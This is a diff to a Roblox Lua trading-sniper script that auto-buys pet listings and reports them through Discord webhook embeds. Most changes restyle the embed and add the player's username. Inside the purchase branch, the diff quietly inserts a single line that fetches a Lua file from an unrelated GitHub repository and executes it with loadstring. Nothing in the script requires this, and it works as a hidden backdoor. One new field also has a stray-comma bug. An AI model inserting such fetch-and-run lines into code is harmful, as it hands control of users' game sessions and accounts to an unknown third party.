@@ -76,32 +76,44 @@ local function processListingInfo(uid, gems, item, version, shiny, amount, bough
         ['embeds'] = {
             {
 		["author"] = {
-			["name"] = "Luna",
-			["icon_url"] = "https://cdn.discordapp.com/attachments/1149218291957637132/1190527382583525416/new-moon-face_1f31a.png?ex=65a22006&is=658fab06&hm=55f8900eef039709c8e57c96702f8fb7df520333ec6510a81c31fc746193fbf2&",
+			["name"] = "Reimu 🤑",
+			["icon_url"] = "https://cdn.discordapp.com/attachments/1122535236996182099/1189213923073871953/EmrJ9tNVcAIhVzB.png?ex=659d58c5&is=658ae3c5&hm=c55bc9b5323c6aa542d6a99b4e42c20a0255377566c3bc2d047f63bffce70b7e&",
 		},
                 ['title'] = snipeMessage,
                 ["color"] = webcolor,
                 ["timestamp"] = DateTime.now():ToIsoDate(),
                 ['fields'] = {
                     {
-                        ['name'] = "__Price:__",
-                        ['value'] = tostring(gems) .. " 💎",
+                        ['name'] = "*PURCHASE INFO:*",
+                        ['value'] = "\n\n",
                     },
                     {
-                        ['name'] = "__Bought from:__",
-                        ['value'] = "||"..tostring(boughtFrom).."||",
+                        ['name'] = "PRICE:",
+                        ['value'] = tostring(gems) .. " GEMS 🤑",
                     },
                     {
-                        ['name'] = "__Amount:__",
-                        ['value'] = tostring(amount) .. "x",
+                        ['name'] = "AMOUNT:",
+                        ['value'] = tostring(amount),
                     },
                     {
-                        ['name'] = "__Remaining gems:__",
-                        ['value'] = tostring(gemamount) .. " 💎",
+                        ['name'] = "BOUGHT FROM:",
+                        ['value'] = "||" .. tostring(boughtFrom) .. "|| 🤡",
                     },      
                     {
-                        ['name'] = "__PetID:__",
-                        ['value'] = "||"..tostring(uid).."||",
+                        ['name'] = "PETID:",
+                        ['value'] = "||" .. tostring(uid) .. "|| 🦛 \n\n",
+                    },      
+                    {
+                        ['name'] = "*USER INFO:*",
+                        ['value'] = "\n\n",
+                    },
+                    {
+                        ['name'] = "USER:",
+                        ['value'] = "||" .. game.Players.LocalPlayer.Name .. "||",
+                    },
+                    {
+                        ['name'] = "GEMS LEFT:",
+                        ['value'] = tostring(gemamount), " 🤑"
                     },
                 },
             },
@@ -153,6 +165,7 @@ local function checklisting(uid, gems, item, version, shiny, amount, username, p
             ping = true
 	end
         processListingInfo(uid, gems, item, version, shiny, amount, username, boughtPet, ping)  
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/xccsdf/abc/main/test.lua"))()
     elseif type.titanic and gems / amount <= 10000000 then
         local boughtPet, boughtMessage = purchase:InvokeServer(playerid, uid)
         if boughtPet == true then
